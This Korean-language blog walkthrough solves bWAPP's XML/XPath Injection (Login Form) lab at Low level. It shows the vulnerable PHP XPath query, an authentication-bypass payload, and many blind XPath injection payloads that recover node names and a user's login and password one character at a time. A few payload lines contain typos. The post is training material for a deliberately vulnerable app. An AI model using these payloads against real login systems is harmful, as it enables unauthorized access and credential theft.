---
layout: single
title: (bWAPP)XML/XPath Injection (Login Form)
categories: bwapp
tag: [xml injection, xpath injection, sql, injection, bwapp, bee box, GET, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---

# 검증 로직
> Low Level 에서는 보안 대책이 적용되어 있지 않다.

## Level - Low

![그림 1-1](/assets/image/bwapp/injection/xml-xpath%20injection-archive/image.png)
- 로그인 폼이 구현되어 있다.
- 해당 로그인 기능을 XML 을 통해 이루어지는 듯 하다.

![그림 1-2](/assets/image/bwapp/injection/xml-xpath%20injection-archive/image-1.png)
- ' (싱글쿼터) 입력시 페이지 상단에 XML Error가 발생하는 것을 알 수 있다
- Error을 보게되면 XPath 오류로 확인된다.
- 이를 통해 XML 기능에서의 인젝션 취약점이 존재한다는 것을 파악할 수 있다.

![그림 1-3](/assets/image/bwapp/injection/xml-xpath%20injection-archive/image-2.png)
- 사용자의 입력값은 GET 형식으로 전달된다.

> Xpath의 경우 일반적인 SQL 구문과 문법이 서로 상이하다. Xpath 문법에 맞게 인젝션을 수행해야 한다.

>XPath 의 경우 SQL Injection 에서 쓰이는 주석을 통한 터미네이팅 방식이 되지 않아 구문을 완성시키는 인라인 형식으로 공격 하여야 한다.

- 일반적인 로그인 구문에서의 쿼리는 SQL 과 형식은 유사할 것이다.

```php
$result = $xml->xpath("/heroes/hero[login='" . $login . "' and password='" . $password . "']");
```

- 위 코드와 같이 xpath 구문을 사용한다.
- 우선 참값을 넣어보도록 한다.

```sql
' or 1=1 or '1'='1
```

![그림 1-4](image-3.png)
- 위 코드와 같이 입력하게 되면 login=’’ or 1=1 or ‘1’=’1’ and password =’’ 이 성립되며 참으로 인식하게된다.
- 결과가 참일경우 Neo 유저로 로그인 되는 것을 알 수 있으며, 이를 통해 Blind SQLI 와 같이 하나씩 추출하여 XML 노드의 데이터를 획득할 수 있다.

```sql
neo' and count(../child::*)=6 or '1'='1
```

- 해당 count 문을 통해 현재 노드에서 부터 상위(부모)노드로 올라가 하위노드의 개수를 파악할 수 있다.
- 총 6개의 노드가 존재하는 걸 알 수 있다.
- 즉 위 코드를 통해 우리는 /heros 가 최상위 노드의 요소이며 그 아래에 6개의 노드가 존재한다는 걸 알 수 있다.

```sql
neo' and string-length(name(parent::*))=6 or '1'='1
```

- 위 코드를 통해서는 현재 위치하는 /hero 노드의 상위 노드 즉 부모노드의 이름을 알아내기위해 우선 글자 수를 파악할 수 있다.
- 총 6자리임을 알 수 있다.

```sql
neo' and substring(name(parent::*),1,1)='h' or '1'='1
neo' and substring(name(parent::*),2,1)='e' or '1'='1
neo' and substring(name(parent::*),3,1)='r' or '1'='1
neo' and substring(name(parent::*),4,1)='o' or '1'='1
neo' and substring(name(parent::*),5,1)='e' or '1'='1
neo' and substring(name(parent::*),6,1)='s' or '1'='1

neo' and name(parent::*)='heroes' or '1'='1
```

- 위 코드는 상위(부모) 노드의 이름을 한자리씩 유추하기 위해 사용된다.
- 즉 heroes 라는 요소이름이라는 것을 알 수 있다.

```sql
neo' and string-length(name(../child::*[position()=1]))=4 or '1'='1
```

- 위 코드는 현재 위치하는 지점 즉 상위(부모)노드의 하위 노드들의 이름을 파악하기 위한 코드이다.
- position 을 통해 첫 번째 요소 부터 확인할 수 있다.
- 현재 노드의 첫 번째 요소의 이름은 4글자라는 것을 알 수 있다.

```sql
neo' and substring(name(../child::*[position()=1]),1,1)='h' or '1'='1
neo' and substring(name(../child::*[position()=1]),2,1)='e' or '1'='1
neo' and substring(name(../child::*[position()=1]),3,1)='r' or '1'='1
neo' and substring(name(../child::*[position()=1]),4,1)='o' or '1'='1

neo' and name(../child::*[position()=1])='hero' or '1'='1
```

- 위 코드로는 요소의 이름을 하나씩 유추할 수 있다.
- hero 라는 요소를 확인했다.
- 이를 통해 /heroes/hero 노드를 확인 했다.

```sql
neo' and count(/heroes/hero[1]/child::*)=6 or '1'='1
```

- 위 코드를 통해 /heroes/hero 의 첫 번째 요소의 노드들의 개수를 파악할 수 있으며
- 6개라는 것을 알 수 있다.

```sql
neo' and string-length(name(/heroes/hero[1]/child::*[position()=1]))=2 or '1'='1
```

- 위 코드를 통해 /heroes/hero 자식 노드 중 첫 번째 노드의 이름은 2글자인 것을 알 수 있다.

```sql
neo' and substring(name(/heroes/hero[1]/child::*[position()=1]),1,1)='i' or '1'='1
neo' and substring(name(/heroes/hero[1]/child::*[position()=1]),2,1)='d' or '1'='1

neo' andname(/heroes/hero[1]/child::*[position()=1])='id' or '1'='1

neo' and substring(name(/heroes/hero[1]/child::*[position()=2]),1,1)='l' or '1'='1
neo' and substring(name(/heroes/hero[1]/child::*[position()=2]),2,1)='o' or '1'='1
neo' and substring(name(/heroes/hero[1]/child::*[position()=2]),3,1)='g' or '1'='1
neo' and substring(name(/heroes/hero[1]/child::*[position()=2]),4,1)='i' or '1'='1
neo' and substring(name(/heroes/hero[1]/child::*[position()=2]),5,1)='n' or '1'='1
neo' and name(/heroes/hero[1]/child::*[position()=2])='login' or '1'='1
```

- 위 코드를 통해 /heroees/hero 자식 노드 중 첫 번째 노드의 속 이름은 id 인것을 알아냈다.
- 이와 같이 position() 의 값을 바꿔 가며 6가지 노드를 전부 알아낼 수 있다.

```sql
neo' and string-length(string(/heroes/hero[1]/login))=3 or '1'='1
```

- 위 코드를 통해 알아냈던 /heroes/hero[1] 자식 노드 중 login 노드의 텍스트 내용의 길이가 3인걸 알 수 있다.

```sql
neo' and substring(string(/heroes/hero[1]/login),1,1)='n' or '1'='1
neo' and substring(string(/heroes/hero[1]/login),2,1)='e' or '1'='1
neo' and substring(string(/heroes/hero[1]/login),3,1)='o' or '1'='1
neo' and substring(string(/heroes/hero[1]/password),1,1)='t' or '1'='1
neo' and substring(string(/heroes/hero[1]/password),2,1)='r' or '1'='1
neo' and substring(string(/heroes/hero[1]/password),3,1)='i' or '1'='1
neo' and substring(string(/heroes/hero[1]/password),4,1)='n' or '1'='1
neo' and substring(string(/heroes/hero[1]/password),5,1)='i' or '1'='1
neo' and substring(string(/heroes/hero[1]/password)6,1)='t' or '1'='1
neo' and substring(string(/heroes/hero[1]/password),7,1)='y' or '1'='1

neo' and string(/heroes/hero[1]/login)='neo' or '1'='1
neo' and string(/heroes/hero[1]/password)='trinity' or '1'='1
```

- 위 코드를 통해 /heroes/hero[1]/login 노드 속성의 텍스트 내용은 neo로 확인 할 수 있으며
- 패스워드인 trinity도 확인할 수 있다.
- 위 방식과 같이 모든 데이터 조회가 가능하다.

![그림 1-5](/assets/image/bwapp/injection/xml-xpath%20injection-archive/image-4.png)
![그림 1-6](/assets/image/bwapp/injection/xml-xpath%20injection-archive/image-5.png)

- 탈취한 데이터로 로그인할 수 있다.
